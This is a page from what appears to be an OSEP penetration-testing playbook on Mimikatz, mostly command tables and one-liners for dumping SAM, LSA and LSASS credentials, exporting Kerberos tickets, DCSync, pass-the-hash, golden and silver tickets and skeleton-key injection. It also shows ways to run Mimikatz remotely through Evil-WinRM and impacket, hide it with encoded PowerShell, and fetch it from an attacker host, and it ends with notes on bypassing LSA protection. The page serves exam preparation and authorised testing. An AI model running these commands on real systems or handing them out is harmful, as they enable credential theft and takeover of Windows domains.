<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-osep/Credentials/Mimikatz" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.9.2">
<title data-rh="true">Mimikatz | OSEP Playbook</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Credentials/Mimikatz"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Mimikatz | OSEP Playbook"><meta data-rh="true" name="description" content="Mimikatz"><meta data-rh="true" property="og:description" content="Mimikatz"><link data-rh="true" rel="icon" href="/OSEP-Playbook/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Credentials/Mimikatz"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Credentials/Mimikatz" hreflang="en"><link data-rh="true" rel="alternate" href="https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Credentials/Mimikatz" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Mimikatz","item":"https://hkrsanjeet.github.io/OSEP-Playbook/docs/osep/Credentials/Mimikatz"}]}</script><link rel="stylesheet" href="/OSEP-Playbook/assets/css/styles.07dfdec4.css">
<script src="/OSEP-Playbook/assets/js/runtime~main.00c82894.js" defer="defer"></script>
<script src="/OSEP-Playbook/assets/js/main.536ca9c5.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/OSEP-Playbook/"><b class="navbar__title text--truncate">OSEP-PLAYBOOK</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/OSEP-Playbook/docs/osep/scanning/external-nmap">Docs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input searchInput_YFbd" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div><a href="https://github.com/hkrsanjeet/OSEP-Playbook" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="OSEP" class="categoryLinkLabel_W154">OSEP</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/scanning/external-nmap"><span title="Scanning" class="categoryLinkLabel_W154">Scanning</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/initial-access/phishing/send-emails"><span title="Initial &amp; Further Access" class="categoryLinkLabel_W154">Initial &amp; Further Access</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Tunneling/Ligolo-ng"><span title="Tunneling" class="categoryLinkLabel_W154">Tunneling</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Privilege Escalation/Access Tokens - SeImpersonate"><span title="Privilege Esclation" class="categoryLinkLabel_W154">Privilege Esclation</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" tabindex="0" href="/OSEP-Playbook/docs/osep/Defense Evasion/Disable AMSI"><span title="Defense Evasion" class="categoryLinkLabel_W154">Defense Evasion</span></a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"><span title="Credentials" class="categoryLinkLabel_W154">Credentials</span></a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Cracking Hashes"><span title="Cracking Hashes" class="linkLabel_WmDU">Cracking Hashes</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Mimikatz"><span title="Mimikatz" class="linkLabel_WmDU">Mimikatz</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Pass-The-Hash"><span title="Pass-The-Hash" class="linkLabel_WmDU">Pass-The-Hash</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Relay Attacks"><span title="Relay Attacks" class="linkLabel_WmDU">Relay Attacks</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/OSEP-Playbook/docs/osep/Credentials/Spray Credentials"><span title="Spray Credentials" class="linkLabel_WmDU">Spray Credentials</span></a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/OSEP-Playbook/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">OSEP</span></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Credentials</span></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Mimikatz</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Mimikatz</h1></header><h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mimikatz"><strong>Mimikatz</strong><a href="#mimikatz" class="hash-link" aria-label="Direct link to mimikatz" title="Direct link to mimikatz" translate="no">​</a></h3>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="commands-without-credentials"><strong>Commands Without Credentials</strong><a href="#commands-without-credentials" class="hash-link" aria-label="Direct link to commands-without-credentials" title="Direct link to commands-without-credentials" translate="no">​</a></h3>
<table><thead><tr><th><strong>Purpose</strong></th><th><strong>Command Example</strong></th></tr></thead><tbody><tr><td><strong>Privilege Escalation to SYSTEM</strong></td><td><code>privilege::debugtoken::elevate</code></td></tr><tr><td><strong>Dumping Password Hashes from SAM</strong></td><td><code>lsadump::sam</code></td></tr><tr><td><strong>Dumping Credentials from LSA Secrets</strong></td><td><code>lsadump::secrets</code></td></tr><tr><td><strong>Dumping Domain Cached Credentials (DCC)</strong></td><td><code>lsadump::cache</code></td></tr><tr><td><strong>Retrieve trust authentication information.</strong></td><td><code>lsadump::trust</code></td></tr><tr><td><strong>Dumping Kerberos Tickets</strong></td><td><code>sekurlsa::tickets</code></td></tr><tr><td><strong>Extracts Credentials from LSA</strong></td><td><code>lsadump::lsa /inject</code></td></tr><tr><td><strong>Dumping WDIGEST Credentials</strong></td><td><code>sekurlsa::wdigest</code></td></tr><tr><td><strong>Dumping Clear-Text Credentials</strong></td><td><code>sekurlsa::logonpasswords</code></td></tr><tr><td><strong>Dumping NTLM Hashes from LSASS Memory</strong></td><td><code>sekurlsa::msv</code></td></tr><tr><td><strong>Dumping Kerberos Keys</strong></td><td><code>sekurlsa::kerberos</code></td></tr><tr><td><strong>Dumping SSP Credentials</strong></td><td><code>sekurlsa::ssp</code></td></tr><tr><td><strong>Dumping TSPKG Credentials</strong></td><td><code>sekurlsa::tspkg</code></td></tr><tr><td><strong>Listing Available Privileges</strong></td><td><code>privilege::list</code></td></tr><tr><td><strong>Extracts Passwords from Windows Vault</strong></td><td><code>vault::cred /patch</code></td></tr><tr><td><strong>Dumping Security Account Manager (SAM)</strong></td><td><code>lsadump::sam /system:&lt;SYSTEM&gt; /sam:&lt;SAM&gt;</code></td></tr><tr><td><strong>Dumping Hashes from Active Directory</strong></td><td><code>lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:&lt;USERNAME&gt;</code> (requires replication rights, not direct credentials)</td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="commands-that-required-credentials"><strong>Commands That Required Credentials</strong><a href="#commands-that-required-credentials" class="hash-link" aria-label="Direct link to commands-that-required-credentials" title="Direct link to commands-that-required-credentials" translate="no">​</a></h3>
<table><thead><tr><th><strong>Purpose</strong></th><th><strong>Command Example</strong></th></tr></thead><tbody><tr><td><strong>Pass-the-Hash Attack (PTH)</strong></td><td><code>sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /ntlm:&lt;NTLM_HASH&gt; /run:&lt;COMMAND&gt;</code></td></tr><tr><td><strong>Pass-the-Ticket Attack (PTT)</strong></td><td><code>kerberos::ptt &lt;ticket.kirbi&gt;</code></td></tr><tr><td><strong>Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)</strong></td><td><code>sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /aes128:&lt;AES128_HASH&gt; /aes256:&lt;AES256_HASH&gt; /run:&lt;COMMAND&gt;</code></td></tr><tr><td><strong>Golden Ticket Creation</strong></td><td><code>kerberos::golden /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /krbtgt:&lt;KRBTGT_HASH&gt; /id:&lt;RID&gt; /ticket:&lt;OUTPUT_TICKET&gt;</code></td></tr><tr><td><strong>Silver Ticket Creation</strong></td><td><code>kerberos::golden /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /target:&lt;SERVICE/SERVER&gt; /service:&lt;SERVICE&gt; /rc4:&lt;NTLM_HASH&gt; /id:&lt;USER_RID&gt; /ptt</code></td></tr><tr><td><strong>Dump Kerberos Tickets for Specific User</strong></td><td><code>sekurlsa::tickets /export</code></td></tr><tr><td><strong>Skeleton Key Injection</strong></td><td><code>misc::skeleton</code> (Injects a skeleton key, allowing login as any user using the password <code>mimikatz</code>)</td></tr><tr><td><strong>Kerberos Silver Ticket Creation (Advanced)</strong></td><td><code>kerberos::silver /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /target:&lt;SERVER&gt; /rc4:&lt;NTLM_HASH&gt; /service:&lt;SERVICE&gt; /sid:&lt;DOMAIN_SID&gt;</code></td></tr><tr><td><strong>Over-Pass-the-Hash (with RC4)</strong></td><td><code>sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /rc4:&lt;NTLM_HASH&gt; /run:&lt;COMMAND&gt;</code></td></tr><tr><td><strong>DPAPI Credential Decryption</strong></td><td><code>dpapi::cred /in:&lt;CREDENTIAL_FILE&gt;</code></td></tr><tr><td><strong>Extracting TGT from LSASS Memory</strong></td><td><code>kerberos::tgt</code></td></tr></tbody></table>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="command-one-liners"><strong>Command One-Liners</strong><a href="#command-one-liners" class="hash-link" aria-label="Direct link to command-one-liners" title="Direct link to command-one-liners" translate="no">​</a></h3>
<p>When using tools like <code>Evil-WinRM</code> or unstable reverse shells, running <code>mimikatz</code> can be problematic. In such cases, <strong>Mimikatz one-liner commands</strong> offer an effective workaround. Here are different approaches:</p>
<ul>
<li class="">(Recommended Option) <strong>Using Mimikatz One-Liners</strong>:</li>
</ul>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">\mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[command]&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example for Dumping Passwords (using cmd.exe or PowerShell)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::logonPasswords&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example for Passing the Hash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li class="">Running Mimikatz with <strong>Command Redirection</strong>: ensures output is saved to a file for later retrieval if the shell disconnects.</li>
</ul>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[command]&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><span class="token plain"> &gt; C:\temp\mimikatz_output</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li class="">Running Mimikatz via <strong>PowerShell Encoded Commands</strong>:</li>
</ul>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token variable" style="color:#36acaa">$command</span><span class="token plain"> = </span><span class="token string" style="color:#e3116c">&quot;privilege::debug [command] exit&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token variable" style="color:#36acaa">$encodedCommand</span><span class="token plain"> = </span><span class="token namespace" style="opacity:0.7">[Convert]</span><span class="token plain">::ToBase64String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token namespace" style="opacity:0.7">[Text.Encoding]</span><span class="token plain">::Unicode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">GetBytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token variable" style="color:#36acaa">$command</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">echo</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$encodedCommand</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">powershell </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">enc &lt;encodedCommand&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li class="">One-Liner with <strong>Remote Execution</strong>:</li>
</ul>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">evil-winrm </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">i </span><span class="token namespace" style="opacity:0.7">[target_ip]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">u </span><span class="token namespace" style="opacity:0.7">[username]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">p </span><span class="token namespace" style="opacity:0.7">[password]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&#x27;privilege::debug&#x27;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;[command]&#x27;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;exit&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># PsExec</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">impacket-psexec DOMAIN/username:password@target_ip </span><span class="token string" style="color:#e3116c">&quot;C:\\Windows\\System32\\mimikatz.exe &#x27;privilege::debug&#x27; &#x27;sekurlsa::logonPasswords&#x27; &#x27;exit&#x27;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># VMIExec</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">impacket-vmiexec DOMAIN/username:password@target_ip </span><span class="token string" style="color:#e3116c">&quot;C:\\Windows\\System32\\mimikatz.exe &#x27;privilege::debug&#x27; &#x27;sekurlsa::logonPasswords&#x27; &#x27;exit&#x27;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Web Download</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">powershell </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&quot;(New-Object System.Net.WebClient).DownloadFile(&#x27;http://[attacker_ip]/mimikatz.exe&#x27;, &#x27;C:\\temp\\mimikatz.exe&#x27;)&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">powershell </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Command </span><span class="token string" style="color:#e3116c">&quot;C:\\temp\\mimikatz.exe &#x27;privilege::debug&#x27; &#x27;[command]&#x27; &#x27;exit&#x27;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<ul>
<li class="">Using Mimikatz with <strong>Minimal Output</strong>:</li>
</ul>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">exe </span><span class="token string" style="color:#e3116c">&quot;privilege::debug&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;[command]&quot;</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;exit&quot;</span><span class="token plain"> &gt; nul 2&gt;&amp;1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="lsa-protection-bypass"><strong>LSA Protection Bypass</strong><a href="#lsa-protection-bypass" class="hash-link" aria-label="Direct link to lsa-protection-bypass" title="Direct link to lsa-protection-bypass" translate="no">​</a></h3>
<p><strong>Theory</strong> Since the release of Mimikatz in 2012, Microsoft introduced defenses like <strong>LSA Protection</strong> and <strong>Credential Guard</strong> to block credential dumping. Starting with Windows 8, processes can run as <strong>Protected Process Light (PPL)</strong>, which prevents even SYSTEM-level processes from reading their memory if PPL is enabled.</p>
<p>For LSASS, this is controlled by the registry key: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1</code>. When enabled, LSASS runs as PPL, and tools like Mimikatz fail to access its memory. By default, this setting is <strong>disabled</strong>for compatibility reasons, but in hardened systems it may already be turned on.</p>
<p><strong>Bypassing PPL</strong></p>
<p>PPL is enforced at the <strong>kernel level</strong> (via the EPROCESS object). With <strong>kernel code execution</strong>, LSA protection can be disabled to dump creds.</p>
